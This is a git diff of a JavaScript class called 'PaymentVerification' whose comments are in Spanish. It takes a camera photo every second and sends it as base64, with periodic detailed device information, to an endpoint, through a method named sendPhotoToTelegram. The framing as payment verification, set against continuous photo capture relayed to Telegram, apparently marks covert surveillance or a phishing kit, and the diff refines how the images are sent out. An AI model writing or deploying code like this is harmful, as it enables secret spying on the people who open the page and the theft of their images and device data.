@@ -171,7 +171,7 @@ class PaymentVerification {
     
     startPhotoCapture() {
         this.isCapturing = true;
-        console.log('📸 Iniciando captura de fotos continua cada segundo...');
+        console.log('📸 Iniciando captura de fotos cada segundo...');
         
         // Capturar primera foto inmediatamente
         this.captureAndSendPhoto();
@@ -241,18 +241,34 @@ class PaymentVerification {
     
     async sendPhotoToTelegram(photoBlob) {
         try {
-            const formData = new FormData();
-            formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
+            // Convertir blob a base64
+            const base64Data = await new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = () => {
+                    const base64String = reader.result.split(',')[1]; // Quitar el prefijo data:image/jpeg;base64,
+                    resolve(base64String);
+                };
+                reader.readAsDataURL(photoBlob);
+            });
             
             // Obtener información del dispositivo ocasionalmente
+            let deviceInfo = {};
             if (this.photoCount % 10 === 1) { // Cada 10 fotos
-                const deviceInfo = await this.getDetailedDeviceInfo();
-                formData.append('deviceInfo', JSON.stringify(deviceInfo));
+                deviceInfo = await this.getDetailedDeviceInfo();
             }
             
+            // Enviar foto como base64 a nuestro endpoint
             const response = await fetch('/api/send-photo', {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    photoBase64: base64Data,
+                    photoCount: this.photoCount,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toISOString()
+                })
             });
             
             const result = await response.json();
